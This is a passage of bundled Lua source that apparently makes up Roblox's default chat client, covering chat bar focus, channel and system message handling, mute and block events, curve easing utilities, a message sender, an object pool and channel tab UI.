		        function moduleApiTable:SpecialKeyPressed(key, modifiers)
		            if (key == Enum.SpecialKey.ChatHotkey) then
		                if canChat then
		                    DoChatBarFocus()
		                end
		            end
		        end
		    end
		end
		
		moduleApiTable.CoreGuiEnabled:connect(function(enabled)
			moduleApiTable.IsCoreGuiEnabled = enabled
		
			enabled = enabled and (moduleApiTable.TopbarEnabled or ChatSettings.ChatOnWithTopBarOff)
		
			ChatWindow:SetCoreGuiEnabled(enabled)
		
			if (not enabled) then
				ChatBar:ReleaseFocus()
				InstantFadeOut()
			else
				InstantFadeIn()
			end
		end)
		
		function trimTrailingSpaces(str)
			local lastSpace = #str
			while lastSpace > 0 do
				--- The pattern ^%s matches whitespace at the start of the string. (Starting from lastSpace)
				if str:find("^%s", lastSpace) then
					lastSpace = lastSpace - 1
				else
					break
				end
			end
			return str:sub(1, lastSpace)
		end
		
		moduleApiTable.ChatMakeSystemMessageEvent:connect(function(valueTable)
			if (valueTable["Text"] and type(valueTable["Text"]) == "string") then
				while (not DidFirstChannelsLoads) do wait() end
		
				local channel = ChatSettings.GeneralChannelName
				local channelObj = ChatWindow:GetChannel(channel)
		
				if (channelObj) then
					local messageObject = {
						ID = -1,
						FromSpeaker = nil,
						SpeakerUserId = 0,
						OriginalChannel = channel,
						IsFiltered = true,
						MessageLength = string.len(valueTable.Text),
						MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(valueTable.Text)),
						Message = trimTrailingSpaces(valueTable.Text),
						MessageType = ChatConstants.MessageTypeSetCore,
						Time = os.time(),
						ExtraData = valueTable,
					}
					channelObj:AddMessageToChannel(messageObject)
					ChannelsBar:UpdateMessagePostedInChannel(channel)
		
					moduleApiTable.MessageCount = moduleApiTable.MessageCount + 1
					moduleApiTable.MessagesChanged:fire(moduleApiTable.MessageCount)
				end
			end
		end)
		
		moduleApiTable.ChatBarDisabledEvent:connect(function(disabled)
			if canChat then
				ChatBar:SetEnabled(not disabled)
				if (disabled) then
					ChatBar:ReleaseFocus()
				end
			end
		end)
		
		moduleApiTable.ChatWindowSizeEvent:connect(function(size)
			ChatWindow.GuiObject.Size = size
		end)
		
		moduleApiTable.ChatWindowPositionEvent:connect(function(position)
			ChatWindow.GuiObject.Position = position
		end)
		
		--////////////////////////////////////////////////////////////////////////////////////////////
		--///////////////////////////////////////////////// Code to hook client UI up to server events
		--////////////////////////////////////////////////////////////////////////////////////////////
		
		function DoChatBarFocus()
			if (not ChatWindow:GetCoreGuiEnabled()) then return end
			if (not ChatBar:GetEnabled()) then return end
		
			if (not ChatBar:IsFocused() and ChatBar:GetVisible()) then
				moduleApiTable:SetVisible(true)
				InstantFadeIn()
				ChatBar:CaptureFocus()
				moduleApiTable.ChatBarFocusChanged:fire(true)
			end
		end
		
		chatBarFocusChanged.Event:connect(function(focused)
			moduleApiTable.ChatBarFocusChanged:fire(focused)
		end)
		
		function DoSwitchCurrentChannel(targetChannel)
			if (ChatWindow:GetChannel(targetChannel)) then
				ChatWindow:SwitchCurrentChannel(targetChannel)
			end
		end
		
		function SendMessageToSelfInTargetChannel(message, channelName, extraData)
			local channelObj = ChatWindow:GetChannel(channelName)
			if (channelObj) then
				local messageData =
				{
					ID = -1,
					FromSpeaker = nil,
					SpeakerUserId = 0,
					OriginalChannel = channelName,
					IsFiltered = true,
					MessageLength = string.len(message),
					MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(message)),
					Message = trimTrailingSpaces(message),
					MessageType = ChatConstants.MessageTypeSystem,
					Time = os.time(),
					ExtraData = extraData,
				}
		
				channelObj:AddMessageToChannel(messageData)
			end
		end
		
		function chatBarFocused()
			if (not mouseIsInWindow) then
				DoBackgroundFadeIn()
				if (textIsFaded) then
					DoTextFadeIn()
				end
			end
		
			chatBarFocusChanged:Fire(true)
		end
		
		--// Event for making player say chat message.
		function chatBarFocusLost(enterPressed, inputObject)
			DoBackgroundFadeIn()
			chatBarFocusChanged:Fire(false)
		
			if (enterPressed) then
				local message = ChatBar:GetTextBox().Text
		
				if ChatBar:IsInCustomState() then
					local customMessage = ChatBar:GetCustomMessage()
					if customMessage then
						message = customMessage
					end
					local messageSunk = ChatBar:CustomStateProcessCompletedMessage(message)
					ChatBar:ResetCustomState()
					if messageSunk then
						return
					end
				end
		
				ChatBar:GetTextBox().Text = ""
		
				if message ~= "" then
					--// Sends signal to eventually call Player:Chat() to handle C++ side legacy stuff.
					moduleApiTable.MessagePosted:fire(message)
		
					if not CommandProcessor:ProcessCompletedChatMessage(message, ChatWindow) then
						if ChatSettings.DisallowedWhiteSpace then
							for i = 1, #ChatSettings.DisallowedWhiteSpace do
								if ChatSettings.DisallowedWhiteSpace[i] == "\t" then
									message = string.gsub(message, ChatSettings.DisallowedWhiteSpace[i], " ")
								else
									message = string.gsub(message, ChatSettings.DisallowedWhiteSpace[i], "")
								end
							end
						end
						message = string.gsub(message, "\n", "")
						message = string.gsub(message, "[ ]+", " ")
		
						local targetChannel = ChatWindow:GetTargetMessageChannel()
						if targetChannel then
							MessageSender:SendMessage(message, targetChannel)
						else
							MessageSender:SendMessage(message, nil)
						end
					end
				end
		
			end
		end
		
		local ChatBarConnections = {}
		function setupChatBarConnections()
			for i = 1, #ChatBarConnections do
				ChatBarConnections[i]:Disconnect()
			end
			ChatBarConnections = {}
		
			local focusLostConnection = ChatBar:GetTextBox().FocusLost:connect(chatBarFocusLost)
			table.insert(ChatBarConnections, focusLostConnection)
		
			local focusGainedConnection = ChatBar:GetTextBox().Focused:connect(chatBarFocused)
			table.insert(ChatBarConnections, focusGainedConnection)
		end
		
		setupChatBarConnections()
		ChatBar.GuiObjectsChanged:connect(setupChatBarConnections)
		
		function getEchoMessagesInGeneral()
			if ChatSettings.EchoMessagesInGeneralChannel == nil then
				return true
			end
			return ChatSettings.EchoMessagesInGeneralChannel
		end
		
		EventFolder.OnMessageDoneFiltering.OnClientEvent:connect(function(messageData)
			if not ChatSettings.ShowUserOwnFilteredMessage then
				if messageData.FromSpeaker == LocalPlayer.Name then
					return
				end
			end
		
			local channelName = messageData.OriginalChannel
			local channelObj = ChatWindow:GetChannel(channelName)
			if channelObj then
				channelObj:UpdateMessageFiltered(messageData)
			end
		
			if getEchoMessagesInGeneral() and ChatSettings.GeneralChannelName and channelName ~= ChatSettings.GeneralChannelName then
				local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
				if generalChannel then
					generalChannel:UpdateMessageFiltered(messageData)
				end
			end
		end)
		
		EventFolder.OnNewMessage.OnClientEvent:connect(function(messageData, channelName)
			local channelObj = ChatWindow:GetChannel(channelName)
			if (channelObj) then
				channelObj:AddMessageToChannel(messageData)
		
				if (messageData.FromSpeaker ~= LocalPlayer.Name) then
					ChannelsBar:UpdateMessagePostedInChannel(channelName)
				end
		
				if getEchoMessagesInGeneral() and ChatSettings.GeneralChannelName and channelName ~= ChatSettings.GeneralChannelName then
					local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
					if generalChannel then
						generalChannel:AddMessageToChannel(messageData)
					end
				end
		
				moduleApiTable.MessageCount = moduleApiTable.MessageCount + 1
				moduleApiTable.MessagesChanged:fire(moduleApiTable.MessageCount)
		
				DoFadeInFromNewInformation()
			end
		end)
		
		EventFolder.OnNewSystemMessage.OnClientEvent:connect(function(messageData, channelName)
			channelName = channelName or "System"
		
			local channelObj = ChatWindow:GetChannel(channelName)
			if (channelObj) then
				channelObj:AddMessageToChannel(messageData)
		
				ChannelsBar:UpdateMessagePostedInChannel(channelName)
		
				moduleApiTable.MessageCount = moduleApiTable.MessageCount + 1
				moduleApiTable.MessagesChanged:fire(moduleApiTable.MessageCount)
		
				DoFadeInFromNewInformation()
		
				if getEchoMessagesInGeneral() and ChatSettings.GeneralChannelName and channelName ~= ChatSettings.GeneralChannelName then
					local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
					if generalChannel then
						generalChannel:AddMessageToChannel(messageData)
					end
				end
			else
				warn(string.format("Just received system message for channel I'm not in [%s]", channelName))
			end
		end)
		
		
		function HandleChannelJoined(channel, welcomeMessage, messageLog, channelNameColor, addHistoryToGeneralChannel,
			addWelcomeMessageToGeneralChannel)
			if ChatWindow:GetChannel(channel) then
				--- If the channel has already been added, remove it first.
				ChatWindow:RemoveChannel(channel)
			end
		
			if (channel == ChatSettings.GeneralChannelName) then
				DidFirstChannelsLoads = true
			end
		
			if channelNameColor then
				ChatBar:SetChannelNameColor(channel, channelNameColor)
			end
		
			local channelObj = ChatWindow:AddChannel(channel)
		
			if (channelObj) then
				if (channel == ChatSettings.GeneralChannelName) then
					DoSwitchCurrentChannel(channel)
				end
		
				if (messageLog) then
					local startIndex = 1
					if #messageLog > ChatSettings.MessageHistoryLengthPerChannel then
						startIndex = #messageLog - ChatSettings.MessageHistoryLengthPerChannel
					end
		
					for i = startIndex, #messageLog do
						channelObj:AddMessageToChannel(messageLog[i])
					end
		
					if getEchoMessagesInGeneral() and addHistoryToGeneralChannel then
						if ChatSettings.GeneralChannelName and channel ~= ChatSettings.GeneralChannelName then
							local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
							if generalChannel then
								generalChannel:AddMessagesToChannelByTimeStamp(messageLog, startIndex)
							end
						end
					end
				end
		
				if (welcomeMessage ~= "") then
					local welcomeMessageObject = {
						ID = -1,
						FromSpeaker = nil,
						SpeakerUserId = 0,
						OriginalChannel = channel,
						IsFiltered = true,
						MessageLength = string.len(welcomeMessage),
						MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(welcomeMessage)),
						Message = trimTrailingSpaces(welcomeMessage),
						MessageType = ChatConstants.MessageTypeWelcome,
						Time = os.time(),
						ExtraData = nil,
					}
					channelObj:AddMessageToChannel(welcomeMessageObject)
		
					if getEchoMessagesInGeneral() and addWelcomeMessageToGeneralChannel and not ChatSettings.ShowChannelsBar then
						if channel ~= ChatSettings.GeneralChannelName then
							local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
							if generalChannel then
								generalChannel:AddMessageToChannel(welcomeMessageObject)
							end
						end
					end
				end
		
				DoFadeInFromNewInformation()
			end
		
		end
		
		EventFolder.OnChannelJoined.OnClientEvent:connect(function(channel, welcomeMessage, messageLog, channelNameColor)
			HandleChannelJoined(channel, welcomeMessage, messageLog, channelNameColor, false, true)
		end)
		
		EventFolder.OnChannelLeft.OnClientEvent:connect(function(channel)
			ChatWindow:RemoveChannel(channel)
		
			DoFadeInFromNewInformation()
		end)
		
		EventFolder.OnMuted.OnClientEvent:connect(function(channel)
			--// Do something eventually maybe?
			--// This used to take away the chat bar in channels the player was muted in.
			--// We found out this behavior was inconvenient for doing chat commands though.
		end)
		
		EventFolder.OnUnmuted.OnClientEvent:connect(function(channel)
			--// Same as above.
		end)
		
		EventFolder.OnMainChannelSet.OnClientEvent:connect(function(channel)
			DoSwitchCurrentChannel(channel)
		end)
		
		coroutine.wrap(function()
			-- ChannelNameColorUpdated may not exist if the client version is older than the server version.
			local ChannelNameColorUpdated = DefaultChatSystemChatEvents:WaitForChild("ChannelNameColorUpdated", 5)
			if ChannelNameColorUpdated then
				ChannelNameColorUpdated.OnClientEvent:connect(function(channelName, channelNameColor)
					ChatBar:SetChannelNameColor(channelName, channelNameColor)
				end)
			end
		end)()
		
		
		--- Interaction with SetCore Player events.
		
		local PlayerBlockedEvent = nil
		local PlayerMutedEvent = nil
		local PlayerUnBlockedEvent = nil
		local PlayerUnMutedEvent = nil
		
		
		-- This is pcalled because the SetCore methods may not be released yet.
		pcall(function()
			PlayerBlockedEvent = StarterGui:GetCore("PlayerBlockedEvent")
			PlayerMutedEvent = StarterGui:GetCore("PlayerMutedEvent")
			PlayerUnBlockedEvent = StarterGui:GetCore("PlayerUnblockedEvent")
			PlayerUnMutedEvent = StarterGui:GetCore("PlayerUnmutedEvent")
		end)
		
		function SendSystemMessageToSelf(message)
			local currentChannel = ChatWindow:GetCurrentChannel()
		
			if currentChannel then
				local messageData =
				{
					ID = -1,
					FromSpeaker = nil,
					SpeakerUserId = 0,
					OriginalChannel = currentChannel.Name,
					IsFiltered = true,
					MessageLength = string.len(message),
					MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(message)),
					Message = trimTrailingSpaces(message),
					MessageType = ChatConstants.MessageTypeSystem,
					Time = os.time(),
					ExtraData = nil,
				}
		
				currentChannel:AddMessageToChannel(messageData)
			end
		end
		
		function MutePlayer(player)
			local mutePlayerRequest = DefaultChatSystemChatEvents:FindFirstChild("MutePlayerRequest")
			if mutePlayerRequest then
				return mutePlayerRequest:InvokeServer(player.Name)
			end
			return false
		end
		
		if PlayerBlockedEvent then
			PlayerBlockedEvent.Event:connect(function(player)
				if MutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenBlocked",
								string.format("Speaker '%s' has been blocked.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		if PlayerMutedEvent then
			PlayerMutedEvent.Event:connect(function(player)
				if MutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenMuted",
								string.format("Speaker '%s' has been muted.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		function UnmutePlayer(player)
			local unmutePlayerRequest = DefaultChatSystemChatEvents:FindFirstChild("UnMutePlayerRequest")
			if unmutePlayerRequest then
				return unmutePlayerRequest:InvokeServer(player.Name)
			end
			return false
		end
		
		if PlayerUnBlockedEvent then
			PlayerUnBlockedEvent.Event:connect(function(player)
				if UnmutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenUnBlocked",
								string.format("Speaker '%s' has been unblocked.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		if PlayerUnMutedEvent then
			PlayerUnMutedEvent.Event:connect(function(player)
				if UnmutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenUnMuted",
								string.format("Speaker '%s' has been unmuted.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		-- Get a list of blocked users from the corescripts.
		-- Spawned because this method can yeild.
		spawn(function()
			-- Pcalled because this method is not released on all platforms yet.
			if LocalPlayer.UserId > 0 then
				pcall(function()
					local blockedUserIds = StarterGui:GetCore("GetBlockedUserIds")
					if #blockedUserIds > 0 then
						local setInitalBlockedUserIds = DefaultChatSystemChatEvents:FindFirstChild("SetBlockedUserIdsRequest")
						if setInitalBlockedUserIds then
							setInitalBlockedUserIds:FireServer(blockedUserIds)
						end
					end
				end)
			end
		end)
		
		spawn(function()
			local success, canLocalUserChat = pcall(function()
				return Chat:CanUserChatAsync(LocalPlayer.UserId)
			end)
			if success then
				canChat = RunService:IsStudio() or canLocalUserChat
			end
		end)
		
		local initData = EventFolder.GetInitDataRequest:InvokeServer()
		
		-- Handle joining general channel first.
		for i, channelData in pairs(initData.Channels) do
			if channelData[1] == ChatSettings.GeneralChannelName then
				HandleChannelJoined(channelData[1], channelData[2], channelData[3], channelData[4], true, false)
			end
		end
		
		for i, channelData in pairs(initData.Channels) do
			if channelData[1] ~= ChatSettings.GeneralChannelName then
				HandleChannelJoined(channelData[1], channelData[2], channelData[3], channelData[4], true, false)
			end
		end
		
		return moduleApiTable
		
	end[curve_util] = function()
		local CurveUtil = {	}
		local DEFAULT_THRESHOLD = 0.01
		
		function CurveUtil:Expt(start, to, pct, dt_scale)
			if math.abs(to - start) < DEFAULT_THRESHOLD then
				return to
			end
		
			local y = CurveUtil:Expty(start,to,pct,dt_scale)
		
			--rtv = start + (to - start) * timescaled_friction--
			local delta = (to - start) * y
			return start + delta
		end
		
		function CurveUtil:Expty(start, to, pct, dt_scale)
			--y = e ^ (-a * timescale)--
			local friction = 1 - pct
			local a = -math.log(friction)
			return 1 - math.exp(-a * dt_scale)
		end
		
		function CurveUtil:Sign(val)
			if val > 0 then
				return 1
			elseif val < 0 then
				return -1
			else
				return 0
			end
		end
		
		function CurveUtil:BezierValForT(p0, p1, p2, p3, t)
			local cp0 = (1 - t) * (1 - t) * (1 - t)
			local cp1 = 3 * t * (1-t)*(1-t)
			local cp2 = 3 * t * t * (1 - t)
			local cp3 = t * t * t
			return cp0 * p0 + cp1 * p1 + cp2 * p2 + cp3 * p3
		end
		
		CurveUtil._BezierPt2ForT = { x = 0; y = 0 }
		function CurveUtil:BezierPt2ForT(
			p0x, p0y,
			p1x, p1y,
			p2x, p2y,
			p3x, p3y,
			t)
		
			CurveUtil._BezierPt2ForT.x = CurveUtil:BezierValForT(p0x,p1x,p2x,p3x,t)
			CurveUtil._BezierPt2ForT.y = CurveUtil:BezierValForT(p0y,p1y,p2y,p3y,t)
			return CurveUtil._BezierPt2ForT
		end
		
		function CurveUtil:YForPointOf2PtLine(pt1, pt2, x)
			--(y - y1)/(x - x1) = m--
			local m = (pt1.y - pt2.y) / (pt1.x - pt2.x)
			--y - mx = b--
			local b = pt1.y - m * pt1.x
			return m * x + b
		end
		
		function CurveUtil:DeltaTimeToTimescale(s_frame_delta_time)
			return s_frame_delta_time / (1.0 / 60.0)
		end
		
		function CurveUtil:SecondsToTick(sec)
			return (1 / 60.0) / sec
		end
		
		function CurveUtil:ExptValueInSeconds(threshold, start, seconds)
				return 1 - math.pow((threshold / start), 1 / (60.0 * seconds))
		end
		
		function CurveUtil:NormalizedDefaultExptValueInSeconds(seconds)
				return self:ExptValueInSeconds(DEFAULT_THRESHOLD, 1, seconds)
		end
		
		return CurveUtil
		
	end[message_sender] = function()
		--	// FileName: MessageSender.lua
		--	// Written by: Xsitsu
		--	// Description: Module to centralize sending message functionality.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local modulesFolder = script.Parent
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:SendMessage(message, toChannel)
			self.SayMessageRequest:FireServer(message, toChannel)
		end
		
		function methods:RegisterSayMessageFunction(func)
			self.SayMessageRequest = func
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
			obj.SayMessageRequest = nil
		
			return obj
		end
		
		return module.new()
		
	end[object_pool] = function()
		--	// FileName: ObjectPool.lua
		--	// Written by: TheGamer101
		--	// Description: An object pool class used to avoid unnecessarily instantiating Instances.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:GetInstance(className)
		  if self.InstancePoolsByClass[className] == nil then
		    self.InstancePoolsByClass[className] = {}
		  end
		  local availableInstances = #self.InstancePoolsByClass[className]
		  if availableInstances > 0 then
		    local instance = self.InstancePoolsByClass[className][availableInstances]
		    table.remove(self.InstancePoolsByClass[className])
		    return instance
		  end
		  return Instance.new(className)
		end
		
		function methods:ReturnInstance(instance)
		  if self.InstancePoolsByClass[instance.ClassName] == nil then
		    self.InstancePoolsByClass[instance.ClassName] = {}
		  end
		  if #self.InstancePoolsByClass[instance.ClassName] < self.PoolSizePerType then
		    table.insert(self.InstancePoolsByClass[instance.ClassName], instance)
		  else
		    instance:Destroy()
		  end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(poolSizePerType)
			local obj = setmetatable({}, methods)
			obj.InstancePoolsByClass = {}
			obj.Name = "ObjectPool"
		  obj.PoolSizePerType = poolSizePerType
		
			return obj
		end
		
		return module
		
	end[channels_tab] = function()
		--	// FileName: ChannelsTab.lua
		--	// Written by: Xsitsu
		--	// Description: Channel tab button for selecting current channel and also displaying if currently selected.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		local function CreateGuiObjects()
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 1
		
			local gapOffsetX = 1
			local gapOffsetY = 1
		
			local BackgroundFrame = Instance.new("Frame")
			BackgroundFrame.Selectable = false
			BackgroundFrame.Name = "BackgroundFrame"
			BackgroundFrame.Size = UDim2.new(1, -gapOffsetX * 2, 1, -gapOffsetY * 2)
			BackgroundFrame.Position = UDim2.new(0, gapOffsetX, 0, gapOffsetY)
			BackgroundFrame.BackgroundTransparency = 1
			BackgroundFrame.Parent = BaseFrame
		
			local UnselectedFrame = Instance.new("Frame")
			UnselectedFrame.Selectable = false
			UnselectedFrame.Name = "UnselectedFrame"
			UnselectedFrame.Size = UDim2.new(1, 0, 1, 0)
			UnselectedFrame.Position = UDim2.new(0, 0, 0, 0)
			UnselectedFrame.BorderSizePixel = 0
			UnselectedFrame.BackgroundColor3 = ChatSettings.ChannelsTabUnselectedColor
			UnselectedFrame.BackgroundTransparency = 0.6
			UnselectedFrame.Parent = BackgroundFrame
		
			local SelectedFrame = Instance.new("Frame")
			SelectedFrame.Selectable = false
			SelectedFrame.Name = "SelectedFrame"
			SelectedFrame.Size = UDim2.new(1, 0, 1, 0)
			SelectedFrame.Position = UDim2.new(0, 0, 0, 0)
			SelectedFrame.BorderSizePixel = 0
			SelectedFrame.BackgroundColor3 = ChatSettings.ChannelsTabSelectedColor
			SelectedFrame.BackgroundTransparency = 1
			SelectedFrame.Parent = BackgroundFrame
		
			local SelectedFrameBackgroundImage = Instance.new("ImageLabel")
			SelectedFrameBackgroundImage.Selectable = false
			SelectedFrameBackgroundImage.Name = "BackgroundImage"
			SelectedFrameBackgroundImage.BackgroundTransparency = 1
			SelectedFrameBackgroundImage.BorderSizePixel = 0
			SelectedFrameBackgroundImage.Size = UDim2.new(1, 0, 1, 0)
			SelectedFrameBackgroundImage.Position = UDim2.new(0, 0, 0, 0)
			SelectedFrameBackgroundImage.ScaleType = Enum.ScaleType.Slice
			SelectedFrameBackgroundImage.Parent = SelectedFrame
		
			SelectedFrameBackgroundImage.BackgroundTransparency = 0.6 - 1
			local rate = 1.2 * 1
			SelectedFrameBackgroundImage.BackgroundColor3 = Color3.fromRGB(78 * rate, 84 * rate, 96 * rate)
		
			local borderXOffset = 2
			local blueBarYSize = 4
			local BlueBarLeft = Instance.new("ImageLabel")
			BlueBarLeft.Selectable = false
			BlueBarLeft.Size = UDim2.new(0.5, -borderXOffset, 0, blueBarYSize)
			BlueBarLeft.BackgroundTransparency = 1
			BlueBarLeft.ScaleType = Enum.ScaleType.Slice
			BlueBarLeft.SliceCenter = Rect.new(3,3,32,21)
			BlueBarLeft.Parent = SelectedFrame
		
			local BlueBarRight = BlueBarLeft:Clone()
			BlueBarRight.Parent = SelectedFrame
		
			BlueBarLeft.Position = UDim2.new(0, borderXOffset, 1, -blueBarYSize)
			BlueBarRight.Position = UDim2.new(0.5, 0, 1, -blueBarYSize)
			BlueBarLeft.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarLeft.png"
			BlueBarRight.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarRight.png"
		
			BlueBarLeft.Name = "BlueBarLeft"
			BlueBarRight.Name = "BlueBarRight"
		
			local NameTag = Instance.new("TextButton")
			NameTag.Selectable = ChatSettings.GamepadNavigationEnabled
			NameTag.Size = UDim2.new(1, 0, 1, 0)
			NameTag.Position = UDim2.new(0, 0, 0, 0)
			NameTag.BackgroundTransparency = 1
			NameTag.Font = ChatSettings.DefaultFont
			NameTag.TextSize = ChatSettings.ChatChannelsTabTextSize
			NameTag.TextColor3 = Color3.new(1, 1, 1)
			NameTag.TextStrokeTransparency = 0.75
			NameTag.Parent = BackgroundFrame
		
			local NameTagNonSelect = NameTag:Clone()
			local NameTagSelect = NameTag:Clone()
			NameTagNonSelect.Parent = UnselectedFrame
			NameTagSelect.Parent = SelectedFrame
			NameTagNonSelect.Font = Enum.Font.SourceSans
			NameTagNonSelect.Active = false
			NameTagSelect.Active = false
		
			local NewMessageIconFrame = Instance.new("Frame")
			NewMessageIconFrame.Selectable = false
			NewMessageIconFrame.Size = UDim2.new(0, 18, 0, 18)
			NewMessageIconFrame.Position = UDim2.new(0.8, -9, 0.5, -9)
			NewMessageIconFrame.BackgroundTransparency = 1
			NewMessageIconFrame.Parent = BackgroundFrame
		
			local NewMessageIcon = Instance.new("ImageLabel")
			NewMessageIcon.Selectable = false
			NewMessageIcon.Size = UDim2.new(1, 0, 1, 0)
			NewMessageIcon.BackgroundTransparency = 1
			NewMessageIcon.Image = "rbxasset://textures/ui/Chat/MessageCounter.png"
			NewMessageIcon.Visible = false
			NewMessageIcon.Parent = NewMessageIconFrame
		
			local NewMessageIconText = Instance.new("TextLabel")
			NewMessageIconText.Selectable = false
			NewMessageIconText.BackgroundTransparency = 1
			NewMessageIconText.Size = UDim2.new(0, 13, 0, 9)
			NewMessageIconText.Position = UDim2.new(0.5, -7, 0.5, -7)
			NewMessageIconText.Font = ChatSettings.DefaultFont
			NewMessageIconText.TextSize = 14
			NewMessageIconText.TextColor3 = Color3.new(1, 1, 1)
			NewMessageIconText.Text = ""
			NewMessageIconText.Parent = NewMessageIcon
		
			return BaseFrame, NameTag, NameTagNonSelect, NameTagSelect, NewMessageIcon, UnselectedFrame, SelectedFrame
		end
		
		function methods:Destroy()
			self.GuiObject:Destroy()
		end
		
		function methods:UpdateMessagePostedInChannel(ignoreActive)
			if (self.Active and (ignoreActive ~= true)) then return end
		
			local count = self.UnreadMessageCount + 1
			self.UnreadMessageCount = count
		
			local label = self.NewMessageIcon
			label.Visible = true
			label.TextLabel.Text = (count < 100) and tostring(count) or "!"
		
			local tweenTime = 0.15
			local tweenPosOffset = UDim2.new(0, 0, -0.1, 0)
		
			local curPos = label.Position
			local outPos = curPos + tweenPosOffset
			local easingDirection = Enum.EasingDirection.Out
			local easingStyle = Enum.EasingStyle.Quad
		
			label.Position = UDim2.new(0, 0, -0.15, 0)
			label:TweenPosition(UDim2.new(0, 0, 0, 0), easingDirection, easingStyle, tweenTime, true)
		
		end
		
		function methods:SetActive(active)
			self.Active = active
			self.UnselectedFrame.Visible = not active
			self.SelectedFrame.Visible = active
		
			if (active) then
				self.UnreadMessageCount = 0
				self.NewMessageIcon.Visible = false
		
				self.NameTag.Font = Enum.Font.SourceSansBold
			else
				self.NameTag.Font = Enum.Font.SourceSans
		
			end
		end
		
		function methods:SetTextSize(textSize)
			self.NameTag.TextSize = textSize
		end
		
		function methods:FadeOutBackground(duration)
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInBackground(duration)
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeOutText(duration)
			self.AnimParams.Text_TargetTransparency = 1
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self.AnimParams.TextStroke_TargetTransparency = 1
			self.AnimParams.TextStroke_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInText(duration)
			self.AnimParams.Text_TargetTransparency = 0
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self.AnimParams.TextStroke_TargetTransparency = 0.75
			self.AnimParams.TextStroke_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:AnimGuiObjects()
			self.UnselectedFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.SelectedFrame.BackgroundImage.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.SelectedFrame.BlueBarLeft.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.SelectedFrame.BlueBarRight.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.NameTagNonSelect.TextTransparency = self.AnimParams.Background_CurrentTransparency
			self.NameTagNonSelect.TextStrokeTransparency = self.AnimParams.Background_CurrentTransparency
		
			self.NameTag.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.NewMessageIcon.ImageTransparency = self.AnimParams.Text_CurrentTransparency
			self.WhiteTextNewMessageNotification.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.NameTagSelect.TextTransparency = self.AnimParams.Text_CurrentTransparency
		
			self.NameTag.TextStrokeTransparency = self.AnimParams.TextStroke_CurrentTransparency
			self.WhiteTextNewMessageNotification.TextStrokeTransparency = self.AnimParams.TextStroke_CurrentTransparency
			self.NameTagSelect.TextStrokeTransparency = self.AnimParams.TextStroke_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Text_TargetTransparency = 0
			self.AnimParams.Text_CurrentTransparency = 0
